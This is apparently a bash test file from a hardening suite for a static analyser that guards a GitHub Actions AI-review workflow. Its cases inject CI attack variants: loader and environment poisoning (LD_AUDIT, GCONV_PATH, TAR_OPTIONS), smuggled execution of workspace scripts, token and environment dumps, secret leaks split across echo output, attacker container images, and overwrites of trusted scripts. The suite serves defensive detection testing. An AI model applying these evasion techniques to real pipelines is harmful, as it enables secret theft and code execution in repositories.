# Hardening suite part 4/4 (sourced by semgrep-sarif-hardening.test.sh):
# recent rounds: YAML/flow, freeze, binutils, secretbind, curl, rpm/m4.
# Uses t/FS/RS/S/H/I/R/O/PR from the lib + entrypoint.
# shellcheck shell=bash disable=SC2154,SC2007 # SC2007: deprecated $[] is an intentional attack payload
# --- assign-prefix peel (self-found: a[0]=x prefixes commands) ---
t runner-peel-subscript 1 "agent-invocation-count" happy.sarif "$R${FS}muse_rc=\$?${FS}a${FS}a[0]=x muse --version"
t runner-peel-pluseq 1 "agent-invocation-count" happy.sarif "$R${FS}muse_rc=\$?${FS}a${FS}v+=x muse --version"

# --- YAML escape decode (Codex P1: "\u0075ses" checkout evades count) ---
t yaml-encoded-checkout 1 "pr-controlled-checkout-count" happy.sarif "$S${FS}      - name: Checkout trusted review scripts${FS}b${FS}      - name: Encoded extra checkout${RS}$S${FS}      - name: Encoded extra checkout${FS}a${FS}        \"\\u0075ses\": actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
        with:
          \"\\u0072ef\": \${{ github.event.pull_request.head.sha }}
          \"\\u0070ath\": evil-dir"
t yaml-encoded-uses 1 "reviewer-unpinned-action" happy.sarif "$S${FS}2:        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0${FS}a${FS}        \"\\x75ses\": evil/action@v1"
t yaml-encoded-persist-fp 0 "" happy.sarif "$S${FS}1:          persist-credentials: false${FS}r${FS}persist-credentials${FS}\"\\u0070ersist-credentials\""

# --- flow mappings (self-found: with:/shell: hidden from line rules) ---
t checkout-flow-with 1 "checkout-flow-with" happy.sarif "$S${FS}1:          persist-credentials: false${FS}a${FS}          with: {ref: main}"
t checkout-flow-shell 1 "shell-override" happy.sarif "$S${FS}      - name: Resolve script directory${FS}b${FS}  defaults: {run: {shell: python}}"

# --- checkout order (Codex P1: trusted->clear->head reorder exits 0) ---
t checkout-order-clear-missing 1 "checkout-order" happy.sarif "$S${FS}      - name: Clear trusted-scripts collision${FS}d${RS}$S${FS}        id: collision${FS}d${RS}$S${FS}2:        if: steps.prereq.outputs.should_run == 'true'${FS}d${RS}$S${FS}2:        run: |${FS}d${RS}$S${FS}2:          set -euo pipefail${FS}d${RS}$S${FS}The trusted checkout below lands${FS}d${RS}$S${FS}PR itself tracks that path${FS}d${RS}$S${FS}sparse checkout lands cleanly${FS}d${RS}$S${FS}merging with (or failing on)${FS}d${RS}$S${FS}Evidence is preserved${FS}d${RS}$S${FS}still carry the PR${FS}d${RS}$S${FS}planted paths degrade${FS}d${RS}$S${FS}symlink sweep sound${FS}d${RS}$S${FS}always the default-branch checkout${FS}d${RS}$S${FS}pruning it from the sweep${FS}d${RS}$S${FS}cat-file -e${FS}d${RS}$S${FS}rm -rf${FS}d${RS}$S${FS}PR tracks trusted-scripts${FS}d${RS}$S${FS}2:          fi${FS}d"
t checkout-order-clear-after 1 "checkout-order" happy.sarif "$S${FS}      - name: Clear trusted-scripts collision${FS}d${RS}$S${FS}        id: collision${FS}d${RS}$S${FS}2:        if: steps.prereq.outputs.should_run == 'true'${FS}d${RS}$S${FS}2:        run: |${FS}d${RS}$S${FS}2:          set -euo pipefail${FS}d${RS}$S${FS}The trusted checkout below lands${FS}d${RS}$S${FS}PR itself tracks that path${FS}d${RS}$S${FS}sparse checkout lands cleanly${FS}d${RS}$S${FS}merging with (or failing on)${FS}d${RS}$S${FS}Evidence is preserved${FS}d${RS}$S${FS}still carry the PR${FS}d${RS}$S${FS}planted paths degrade${FS}d${RS}$S${FS}symlink sweep sound${FS}d${RS}$S${FS}always the default-branch checkout${FS}d${RS}$S${FS}pruning it from the sweep${FS}d${RS}$S${FS}cat-file -e${FS}d${RS}$S${FS}rm -rf${FS}d${RS}$S${FS}PR tracks trusted-scripts${FS}d${RS}$S${FS}2:          fi${FS}d${RS}$S${FS}      - name: Resolve script directory${FS}b${FS}      - name: Clear trusted-scripts collision${RS}$S${FS}- name: Clear trusted-scripts collision${FS}a${FS}        id: collision${RS}$S${FS}id: collision${FS}a${FS}        if: steps.prereq.outputs.should_run == 'true'${RS}$S${FS}2:        if: steps.prereq.outputs.should_run == 'true'${FS}a${FS}        run: |${RS}$S${FS}2:        run: |${FS}a${FS}          set -euo pipefail${RS}$S${FS}2:          set -euo pipefail${FS}a${FS}          # The trusted checkout below lands at trusted-scripts/ inside the${RS}$S${FS}The trusted checkout below lands${FS}a${FS}          # PR workspace: if the PR itself tracks that path, remove the${RS}$S${FS}PR itself tracks that path${FS}a${FS}          # workspace copy first so the sparse checkout lands cleanly${RS}$S${FS}sparse checkout lands cleanly${FS}a${FS}          # instead of merging with (or failing on) submitter-controlled${RS}$S${FS}merging with (or failing on)${FS}a${FS}          # files. Evidence is preserved — diff, manifest, and git objects${RS}$S${FS}Evidence is preserved${FS}a${FS}          # still carry the PR's versions; only working-tree full-file${RS}$S${FS}still carry the PR${FS}a${FS}          # reads of exactly the planted paths degrade to diff context.${RS}$S${FS}planted paths degrade${FS}a${FS}          # This also keeps the symlink sweep sound: the surviving${RS}$S${FS}symlink sweep sound${FS}a${FS}          # trusted-scripts/ tree is always the default-branch checkout,${RS}$S${FS}always the default-branch checkout${FS}a${FS}          # so pruning it from the sweep stays correct.${RS}$S${FS}pruning it from the sweep${FS}a${FS}          if git -C \"\${GITHUB_WORKSPACE}\" cat-file -e \"HEAD:trusted-scripts\" 2>/dev/null; then${RS}$S${FS}cat-file -e${FS}a${FS}            rm -rf \"\${GITHUB_WORKSPACE}/trusted-scripts\"${RS}$S${FS}rm -rf${FS}a${FS}            echo \"::warning::PR tracks trusted-scripts/; workspace copy removed before trusted checkout.\"${RS}$S${FS}PR tracks trusted-scripts${FS}a${FS}          fi"
t checkout-order-clear-dup 1 "checkout-order" happy.sarif "$S${FS}      - name: Resolve script directory${FS}b${FS}      - name: Clear trusted-scripts collision${RS}$S${FS}2:- name: Clear trusted-scripts collision${FS}a${FS}        id: collision-dup${RS}$S${FS}id: collision-dup${FS}a${FS}        if: steps.prereq.outputs.should_run == 'true' && false${RS}$S${FS}&& false${FS}a${FS}        run: echo dup-clear"
t checkout-order-resolver-dup 1 "checkout-order" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Resolve script directory${RS}$S${FS}2:- name: Resolve script directory${FS}a${FS}        id: scriptdir${RS}$S${FS}2:        id: scriptdir${FS}a${FS}        run: echo \"dir=\${GITHUB_WORKSPACE}/evil\" >> \$GITHUB_OUTPUT"
t checkout-order-trusted-dup 1 "checkout-order" happy.sarif "$S${FS}ref: \${{ github.event.pull_request.head.sha }}${FS}a${FS}          path: trusted-scripts"

# --- ps env dump (Codex P1: ps e -p $$ | base64) ---
t helper-ps-env 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ps e -p \$\$ | base64"
t helper-ps-auxe 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ps auxe"
t helper-ps-sysv-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ps -ef"
t helper-ps-user-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ps U eve"
t helper-ps-o-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ps -o etime -p 1"

# --- LD_AUDIT poison (Codex P1: audit DSO runs with token) ---
t helper-ld-audit 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}LD_AUDIT=\"\${GITHUB_WORKSPACE}/evil.so\" /bin/true"
t reviewer-ld-audit 1 "reviewer-env-poison" happy.sarif "$S${FS}          META_API_KEY:${FS}b${FS}          LD_AUDIT: /tmp/evil.so"

# --- TAR_OPTIONS poison (Codex P1: checkpoint-action exec) ---
t helper-tar-options 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf -v TAR_OPTIONS '--checkpoint=1 --checkpoint-action=exec=\${GITHUB_WORKSPACE}/evil.sh'; export TAR_OPTIONS; tar -cf \"\${RUNNER_TEMP}/x.tar\" /dev/null"

# --- runner-home exec (Codex P1: /home/runner/work allowlist) ---
t helper-runner-abspath 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/home/runner/work/Baci/Baci/evil.sh"
t helper-runner-home-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/home/runner/.local/bin/muse --version"

# --- globbed writes (Codex P1: trusted-* copy destination) ---
t helper-glob-write 1 "helper-unzoneable-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cp \"\${GITHUB_WORKSPACE}/evil.sh\" /home/runner/work/Baci/Baci/trusted-*/.github/scripts/muse-review/diff.sh"
t helper-glob-source-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cp *.log /tmp/build.log"
# --- globbed abspath exec (Codex P1: /usr/bin/ba?h) ---
t helper-glob-abspath 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/usr/bin/ba?h \"\${GITHUB_WORKSPACE}/evil.sh\""
t helper-glob-abspath-class 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/usr/bin/ba[rs]h \"\${GITHUB_WORKSPACE}/evil.sh\""

# --- static eval (Codex P1: eval 'bash ./evil.sh') ---
t helper-eval-static 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}eval 'bash ./evil.sh'"

# --- binutils copy dispatch (Codex P1: objcopy + output siblings) ---
t helper-objcopy 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}objcopy -I binary -O binary \"\${GITHUB_WORKSPACE}/evil.sh\" \"\${SCRIPT_DIR}/diff.sh\""
t helper-objcopy-dump 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}objcopy --dump-section .text=\"\${SCRIPT_DIR}/x\" /tmp/a /tmp/b"
t helper-ld-output 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ld /tmp/evil.o -o \"\${SCRIPT_DIR}/diff.sh\""
t helper-ld-default 1 "helper-workspace-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ld /tmp/a.o /tmp/b.o"
t helper-as-output 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}as -o \"\${SCRIPT_DIR}/x.o\" /tmp/x.s"
t helper-strip-inplace 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}strip \"\${SCRIPT_DIR}/diff.sh\""
t helper-ar-modify 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ar rcs \"\${SCRIPT_DIR}/lib.a\" /tmp/e.o"
t helper-ar-list-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ar t /tmp/lib.a"
t helper-ranlib 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ranlib \"\${SCRIPT_DIR}/lib.a\""
t helper-objcopy-help-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}objcopy --help"

# --- loader denylist round 6 (jshell, ssh-keygen, pwsh) ---
t loader-jshell 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}jshell \"\${GITHUB_WORKSPACE}/evil.jsh\""
t loader-ssh-keygen 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ssh-keygen -D \"\${GITHUB_WORKSPACE}/evil.so\""
t loader-pwsh 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}pwsh -File \"\${GITHUB_WORKSPACE}/evil.ps1\""
t loader-powershell 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}powershell -File evil.ps1"

# --- job containers (attacker image supplies token-bearing shells) ---
t container-evil 1 "container-override" happy.sarif "$S${FS}    runs-on: ubuntu-latest${FS}a${FS}    container:\n      image: ghcr.io/attacker/evil:latest"
t container-flow 1 "container-override" happy.sarif "$S${FS}    runs-on: ubuntu-latest${FS}a${FS}    container: { image: ghcr.io/attacker/evil }"
t container-quoted 1 "container-override" happy.sarif "$S${FS}    runs-on: ubuntu-latest${FS}a${FS}    \"container\":\n      image: ghcr.io/attacker/evil"

# --- secret bindings (allowlisted pairs, no step exfil) ---
t secretbind-unexpected 1 "secret-step-unexpected-binding" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Leak key fragment${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          LEAK: \${{ secrets.META_API_KEY }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: |${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          echo \"\${LEAK:0:4} \${LEAK:4}\""
t secretbind-jobenv 1 "secret-step-unexpected-binding" happy.sarif "$S${FS}MUSE_EFFORT_RESOLVED:${FS}a${FS}      LEAK: \${{ secrets.META_API_KEY }}"
t secretbind-echo 1 "secret-step-exfil" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Echo bound token${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: |${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          echo \"token: \$GH_TOKEN\""
t secretbind-printf 1 "secret-step-exfil" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Printf bound token${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: |${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          printf '%s' \"\$GH_TOKEN\""
t secretbind-inline 1 "secret-step-inline-secret" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          echo \"\${{ secrets.FOO }}\""
t secretbind-runtime 1 "secret-step-exfil" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          echo \"\$ACTIONS_RUNTIME_TOKEN\""
t secretbind-dump-set 1 "secret-step-env-dump" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          set"
t secretbind-dump-declarep 1 "secret-step-env-dump" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          declare -p"
t secretbind-singlequote-fp 0 "" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          echo '\$GH_TOKEN'"
t secretbind-namesake-fp 0 "" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          echo \"\$GH_TOKEN_X \$GH_TOKENX\""
t secretbind-set-o-fp 0 "" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          set -o"


# --- round 7: linkers, writers, queries, dumps, agent pins ---
t loader-ld-preload 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/lib64/ld-linux-x86-64.so.2 --preload \"\${GITHUB_WORKSPACE}/evil.so\" /bin/true"
t loader-ld-musl 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/lib/ld-musl-x86_64.so.1 --audit \"\${GITHUB_WORKSPACE}/evil.so\" /bin/true"
t loader-ld-plugin 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ld -plugin \"\${GITHUB_WORKSPACE}/evil.so\" -o /tmp/ld-out /dev/null"
t loader-ld-plain-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ld -o /tmp/ld-out /dev/null"
t loader-swift 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}swift \"\${GITHUB_WORKSPACE}/evil.swift\""
t loader-swiftc 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}swiftc -o /tmp/x \"\${GITHUB_WORKSPACE}/evil.swift\""
t helper-sort-output 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sort -o \"\${SCRIPT_DIR}/diff.sh\" \"\${GITHUB_WORKSPACE}/evil.sh\""
t helper-sort-stdout-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sort \"\${GITHUB_WORKSPACE}/a\" | head"
t helper-sort-compress 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sort --compress-program=\"\${GITHUB_WORKSPACE}/evil\" f"
t helper-iconv-output 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}iconv -f UTF-8 -t UTF-8 -o \"\${SCRIPT_DIR}/diff.sh\" \"\${GITHUB_WORKSPACE}/evil.sh\""
t helper-shuf-output 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}shuf -o \"\${SCRIPT_DIR}/diff.sh\" f"
t helper-uniq-output 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}uniq \"\${GITHUB_WORKSPACE}/a\" \"\${SCRIPT_DIR}/diff.sh\""
t helper-uniq-flagval-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}uniq -s 2 /tmp/in | head"
t helper-split-prefix 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}split -b 1M \"\${GITHUB_WORKSPACE}/a\" \"\${SCRIPT_DIR}/p\""
t helper-split-filter 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}split --filter='tee x' f"
t helper-csplit-prefix 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}csplit f '/x/' -f \"\${SCRIPT_DIR}/p\""
t helper-bash-trailing-help 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}bash \"\${GITHUB_WORKSPACE}/evil.sh\" --help"
t helper-bash-query-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}bash --version"
t helper-source-query 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}source --help"
t helper-declare-attr 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare -x | base64"
t helper-declare-named-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare -x FOO=bar"
t helper-typeset-attr 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}typeset -r"
t helper-gconv 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}GCONV_PATH=\"\${GITHUB_WORKSPACE}/gconv\" iconv -f UTF-8 -t EVIL x"
t helper-arith-bracket 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}arr=(1); [[ 1 -eq 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]' ]]"
t helper-arith-bracket-str-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}[[ \"\$x\" == 'a[b' ]]"
t agent-workspace-rebind 1 "agent-workspace-rebind" happy.sarif "$R${FS}--workspace \"\${GITHUB_WORKSPACE}\"${FS}r${FS}\"\${GITHUB_WORKSPACE}\"${FS}/proc/self"
t agent-workspace-attached 1 "agent-workspace-rebind" happy.sarif "$R${FS}--workspace \"\${GITHUB_WORKSPACE}\"${FS}r${FS}--workspace \"\${GITHUB_WORKSPACE}\"${FS}/--workspace=/proc/self"
t agent-promptfile-rebind 1 "agent-promptfile-rebind" happy.sarif "$R${FS}--prompt-file \"\${PROMPT_FILE}\"${FS}r${FS}\"\${PROMPT_FILE}\"${FS}/proc/self/environ"
t agent-env-tojson 1 "agent-token-expression" happy.sarif "$S${FS}META_API_KEY: \${{ secrets.META_API_KEY }}${FS}a${FS}          LEAKED_CONTEXT: \${{ toJSON(github) }}"
t agent-env-tojson-secrets 1 "agent-token-expression" happy.sarif "$S${FS}META_API_KEY: \${{ secrets.META_API_KEY }}${FS}a${FS}          LEAKED_CONTEXT: \${{ toJSON(secrets) }}"
t agent-env-home 1 "agent-env-home" happy.sarif "$S${FS}META_API_KEY: \${{ secrets.META_API_KEY }}${FS}a${FS}          HOME: \${{ github.workspace }}"
t secretbind-folded 1 "secret-step-unexpected-binding" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Folded leak${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          LEAK: >-${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}            \${{ secrets.META_API_KEY }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: |${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          echo \"\${LEAK:0:4} \${LEAK:4}\""
t secretbind-flow 1 "secret-step-unexpected-binding" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Flow leak${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env: {LEAK: \${{ secrets.META_API_KEY }}}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: echo hi"
t secretbind-interpolated 1 "secret-step-unexpected-binding" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Prefix leak${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          LEAK: \"k=\${{ secrets.META_API_KEY }}\"${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: echo hi"
t secretbind-compare-fp 0 "" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Compare ok${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          HAS_OTHER: \${{ secrets.META_API_KEY != '' }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: echo hi"
t secretbind-agent-semgrep 1 "secret-step-unexpected-binding" happy.sarif "$S${FS}META_API_KEY: \${{ secrets.META_API_KEY }}${FS}a${FS}          SEMGREP_APP_TOKEN: \${{ secrets.SEMGREP_APP_TOKEN }}"
t secretbind-agent-ghtoken 1 "secret-step-unexpected-binding" happy.sarif "$S${FS}META_API_KEY: \${{ secrets.META_API_KEY }}${FS}a${FS}          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}"
t checkout-flow-anchored 1 "checkout-flow-with" happy.sarif "$S${FS}        with:${FS}r${FS}with:${FS}with: &head_inputs { ref: \"\${{ github.event.pull_request.head.sha }}\" }"
t checkout-flow-alias 1 "checkout-flow-with" happy.sarif "$S${FS}        with:${FS}r${FS}with:${FS}with: *head_inputs"
t ref-alias-unresolved 1 "pr-ref-unresolved" happy.sarif "$S${FS}ref: \${{ github.event.pull_request.head.sha }}${FS}r${FS}\${{ github.event.pull_request.head.sha }}${FS}*prsha"

# --- round 8: github.token bindings, data-returning expressions, DOTALL ---
t secretbind-github-token 1 "secret-step-unexpected-binding" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Token leak${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          LEAK: \${{ github.token }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: |${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          echo \"\${LEAK:0:4} \${LEAK:4}\""
t secretbind-github-token-bracket 1 "secret-step-unexpected-binding" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Token leak${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          LEAK: \${{ github['token'] }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: |${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          echo \"\${LEAK:0:4} \${LEAK:4}\""
t secretbind-bracket 1 "secret-step-unexpected-binding" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Bracket leak${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          LEAK: \${{ secrets['META_API_KEY'] }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: |${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          echo \"\${LEAK:0:4} \${LEAK:4}\""
t secretbind-token-dynamic 1 "secret-step-unexpected-binding" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Token leak${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          LEAK: \${{ github[inputs.field] }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: |${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          echo \"\${LEAK:0:4} \${LEAK:4}\""
t secretbind-case 1 "secret-step-unexpected-binding" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Case leak${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          LEAK: \${{ case(secrets.META_API_KEY != '', secrets.META_API_KEY, '') }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: |${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          echo \"\${LEAK:0:4} \${LEAK:4}\""
t secretbind-case-fp 0 "" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Bool compare${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          OK: \${{ secrets.META_API_KEY != '' }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: |${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          echo \"\$OK\""
t secretbind-dotall 1 "secret-step-unexpected-binding" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Literal leak${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          LEAK: |-${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}            \${{${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}              secrets.META_API_KEY${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}            }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: |${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          echo \"\${LEAK:0:4} \${LEAK:4}\""
t secretbind-format 1 "secret-step-unexpected-binding" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Format leak${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          LEAK: \${{ format('k={0}', secrets.META_API_KEY) }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: |${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          echo \"\${LEAK:0:4} \${LEAK:4}\""
t secretbind-or-data 1 "secret-step-unexpected-binding" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Or leak${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          LEAK: \${{ false || secrets.META_API_KEY }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: |${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          echo \"\${LEAK:0:4} \${LEAK:4}\""
t secretbind-contains-fp 0 "" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Bool contains${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          OK: \${{ contains(secrets.META_API_KEY, 'x') }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: |${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          echo \"\$OK\""

# --- round 8: llvm/versioned binutils, time peel, script, dequote, ANSI-C ---
t llvm-objcopy 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}llvm-objcopy -I binary -O binary \"\${GITHUB_WORKSPACE}/evil.sh\" \"\${SCRIPT_DIR}/diff.sh\""
t objcopy-versioned 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}objcopy-12 -I binary -O binary \"\${GITHUB_WORKSPACE}/evil.sh\" \"\${SCRIPT_DIR}/diff.sh\""
t time-o 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/usr/bin/time -o /tmp/timing bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t time-format 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}time -f '%e' bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t time-output-eq 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}time --output=/tmp/x bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t time-version-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}time --version"
t script-c 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}script -q -c 'bash \"\${GITHUB_WORKSPACE}/evil.sh\"' /dev/null"
t script-bare 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}script /dev/null"
